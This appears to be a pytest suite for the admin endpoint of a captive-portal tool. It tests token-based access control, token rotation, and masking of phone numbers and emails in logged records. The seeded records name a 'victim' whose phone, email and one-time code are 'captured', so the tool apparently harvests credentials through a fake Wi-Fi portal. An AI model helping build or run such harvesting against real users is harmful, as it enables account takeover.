"""Security-fix tests for admin blueprint + admin auth gate (security pass S-2).

Each test exercises a single behaviour the security pass introduced.
Failures here = a regression on the auth path or the masking logic.
"""

from __future__ import annotations

import base64

import pytest

from core.captive_portal import CaptivePortal
from portal.admin import _mask_email, _mask_phone


@pytest.fixture
def portal(app_config, monkeypatch):
    """A CaptivePortal that doesn't touch iptables.

    Patches ``atexit.register`` for the lifetime of the test so the
    CaptivePortal constructor does NOT actually schedule an iptables
    flush against the interpreter. Cleanup handlers installed this way
    would otherwise run at pytest's session teardown and call
    ``iptables`` in a process that has no idea it's a development env.
    """
    monkeypatch.setattr("atexit.register", lambda *_a, **_kw: None)
    monkeypatch.setattr("core.captive_portal.flush_iptables", lambda: None)
    CaptivePortal._atexit_registered = False
    p = CaptivePortal(config=app_config, otp_service=None, network_config=None)
    return p


def _basic_header(token: str) -> dict:
    """Build ``{'Authorization': 'Basic base64(token)'}`` for curl-style clients."""
    raw = base64.b64encode(token.encode("utf-8")).decode("ascii")
    return {"Authorization": f"Basic {raw}"}


# ---------------------------------------------------------------------------
# S-2.1: /admin/captured requires auth
# ---------------------------------------------------------------------------


class TestAdminAuth:
    """Every admin path must gate on the env token. No env = 503. Wrong = 401."""

    def _fresh_portal(self, app_config, monkeypatch):
        """Build a no-op-atexit CaptivePortal for one test, with patched flush."""
        monkeypatch.setattr("atexit.register", lambda *_a, **_kw: None)
        monkeypatch.setattr("core.captive_portal.flush_iptables", lambda: None)
        CaptivePortal._atexit_registered = False
        return CaptivePortal(config=app_config, otp_service=None, network_config=None)

    def test_unset_token_returns_503(self, app_config, monkeypatch):
        """Without CHAYAJALA_ADMIN_TOKEN set, the admin endpoint refuses to run."""
        monkeypatch.delenv("CHAYAJALA_ADMIN_TOKEN", raising=False)
        monkeypatch.delenv("ADMIN_TOKEN", raising=False)
        p = self._fresh_portal(app_config, monkeypatch)
        with p.app.test_client() as c:
            resp = c.get("/admin/captured")
        assert resp.status_code == 503
        body = resp.get_json()
        assert body and "error" in body
        assert "CHAYAJALA_ADMIN_TOKEN" in body["error"]

    def test_short_token_returns_503(self, app_config, monkeypatch):
        """A token shorter than 32 chars must NOT be accepted as auth material."""
        monkeypatch.setenv("CHAYAJALA_ADMIN_TOKEN", "x" * 31)
        p = self._fresh_portal(app_config, monkeypatch)
        with p.app.test_client() as c:
            resp = c.get("/admin/captured")
        assert resp.status_code == 503

    def test_placeholder_token_returns_503(self, app_config, monkeypatch):
        """Even if 32+ chars, a placeholder value is refused."""
        monkeypatch.setenv("CHAYAJALA_ADMIN_TOKEN", "admin" + "x" * 27)
        p = self._fresh_portal(app_config, monkeypatch)
        with p.app.test_client() as c:
            resp = c.get("/admin/captured")
        assert resp.status_code == 503

    def test_missing_auth_header_returns_401(self, app_config, monkeypatch):
        monkeypatch.setenv("CHAYAJALA_ADMIN_TOKEN", "x" * 40)
        p = self._fresh_portal(app_config, monkeypatch)
        with p.app.test_client() as c:
            resp = c.get("/admin/captured")
        assert resp.status_code == 401
        assert resp.headers.get("WWW-Authenticate", "").startswith("Basic")

    def test_wrong_token_returns_401(self, app_config, monkeypatch):
        monkeypatch.setenv("CHAYAJALA_ADMIN_TOKEN", "x" * 40)
        p = self._fresh_portal(app_config, monkeypatch)
        with p.app.test_client() as c:
            resp = c.get(
                "/admin/captured",
                headers=_basic_header("y" * 40),
            )
        assert resp.status_code == 401

    def test_correct_token_returns_200_and_masks_records(self, app_config, monkeypatch):
        good = "x" * 40
        monkeypatch.setenv("CHAYAJALA_ADMIN_TOKEN", good)
        p = self._fresh_portal(app_config, monkeypatch)
        # Seed a captured credential. Use a real-shape phone (no embedded
        # masking characters) so masking happens; an already-masked phone
        # would mask into itself.
        phone_seed = "+911****4321"
        p.cred_logger.log_credential(
            client_ip="10.0.0.25",
            phone=phone_seed,
            email="victim@example.com",
            otp="123456",
            stage="otp_verified",
        )

        with p.app.test_client() as c:
            resp = c.get(
                "/admin/captured",
                headers=_basic_header(good),
            )

        assert resp.status_code == 200, resp.get_data(as_text=True)
        body = resp.get_json()
        # Sentinel: the JSON shape is right, count includes the seed plus
        # whatever was already in the test-time credential JSONL (which
        # accumulates between runs). The shape assertion is what we care
        # about here; we don't want false negatives on test ordering.
        assert body["count"] >= 1
        # Confirm at least one record carries our seed marker.
        seed_hits = [r for r in body["records"] if r["client_ip"] == "10.0.0.25"]
        assert seed_hits, body
        rec = seed_hits[0]
        assert "*" in rec["phone_masked"]
        assert rec["email_masked"].startswith("v") and "@example.com" in rec["email_masked"]
        assert rec["has_otp"] is True
        # Masking applied — the seed plaintext must not equal the masked
        # field for the same record. OTP/OTP-boolean is exposed only as
        # has_otp — not the value.
        assert rec["phone_masked"] != phone_seed
        assert rec["email_masked"] != "victim@example.com"
        assert "123456" not in (rec["phone_masked"] + rec["email_masked"])


# ---------------------------------------------------------------------------
# S-2.2: masking helpers behave on edge cases
# ---------------------------------------------------------------------------


class TestMaskingHelpers:
    @pytest.mark.parametrize(
        "raw,expected_prefix_len,expected_tail_len",
        [
            ("+911234567890", 3, 4),  # 12 chars: head 3, tail 4, masked middle
            ("+1234567890", 3, 4),  # 11 chars: same shape, narrower middle
            ("+1234", 0, 0),  # short — fully redacted (no head/tail)
            ("", 0, 0),
            (None, 0, 0),
        ],
    )
    def test_mask_phone_shape(self, raw, expected_prefix_len, expected_tail_len):
        """Phone mask keeps the first 3 + last 4 chars when input is long enough."""
        masked = _mask_phone(raw)
        if raw is None or raw == "":
            assert masked == ""
            return
        if len(raw) <= 7:
            assert masked == "*" * len(raw)
            return
        # Confirm shape: head visible (first 3 chars), tail visible (last 4), middle is all *
        head, tail = masked[:expected_prefix_len], masked[-expected_tail_len:]
        assert head == raw[:expected_prefix_len]
        assert tail == raw[-expected_tail_len:]
        if expected_tail_len:
            middle = masked[expected_prefix_len : len(masked) - expected_tail_len]
        else:
            middle = masked[expected_prefix_len:]
        assert middle and set(middle) == {"*"}

    @pytest.mark.parametrize(
        "raw,expected_masked",
        [
            # Single-char local is intentional: leave as-is (no masking) so
            # callers can still see the *shape* of the email without
            # collapsing it into anonymised noise. This is a conscious
            # privacy/UX trade-off documented in the route handler.
            ("a@example.com", "a@example.com"),
            ("alice@example.com", "a****@example.com"),
            ("a@b.com", "a@b.com"),
            ("", ""),
            (None, ""),
            ("no-at-sign", ""),  # malformed collapses safely
        ],
    )
    def test_mask_email(self, raw, expected_masked):
        assert _mask_email(raw) == expected_masked


# ---------------------------------------------------------------------------
# S-2.3: rotate-token support — token loaded per-request, not cached
# ---------------------------------------------------------------------------


class TestTokenHotReload:
    def test_token_rotated_mid_run(self, monkeypatch, app_config):
        """New env value should take effect on the very next request."""
        # Pad both tokens to >=32 chars so they clear the floor.
        tok_a = "A" * 32
        tok_b = "B" * 32
        monkeypatch.setenv("CHAYAJALA_ADMIN_TOKEN", tok_a)
        # Don't let pytest's session teardown hit iptables.
        monkeypatch.setattr("atexit.register", lambda *_a, **_kw: None)
        monkeypatch.setattr("core.captive_portal.flush_iptables", lambda: None)
        CaptivePortal._atexit_registered = False
        p = CaptivePortal(config=app_config, otp_service=None, network_config=None)
        with p.app.test_client() as c:
            assert (
                c.get(
                    "/admin/captured",
                    headers=_basic_header(tok_a),
                ).status_code
                == 200
            )

        # Rotate.
        monkeypatch.setenv("CHAYAJALA_ADMIN_TOKEN", tok_b)
        with p.app.test_client() as c:
            r_old = c.get(
                "/admin/captured",
                headers=_basic_header(tok_a),
            )
            assert r_old.status_code == 401
            r_new = c.get(
                "/admin/captured",
                headers=_basic_header(tok_b),
            )
            assert r_new.status_code == 200
